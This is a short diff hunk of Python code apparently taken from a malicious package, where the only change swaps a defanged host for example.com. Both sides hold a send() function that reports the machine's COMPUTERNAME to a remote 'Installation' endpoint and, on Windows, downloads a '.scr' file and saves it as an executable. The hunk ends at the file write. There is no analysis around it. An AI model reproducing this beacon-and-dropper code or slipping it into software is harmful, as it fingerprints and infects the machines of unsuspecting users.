@@ -11,9 +11,9 @@ import base64
 def send():
     try:
         env = os.environ['COMPUTERNAME']
-        t = requests.get("https://DEFANGED.com/pyp/resp.php?live=Installation " +env)
+        t = requests.get("https://example.com/pyp/resp.php?live=Installation " +env)
         if platform == 'win32':
-            url = 'https://DEFANGED.com/python-install.scr'
+            url = 'https://example.com/python-install.scr'
             filename = 'ini_file_pyp_32.exe'
             rq = requests.get(url, allow_redirects=True)
             open(filename, 'wb').write(rq.content)
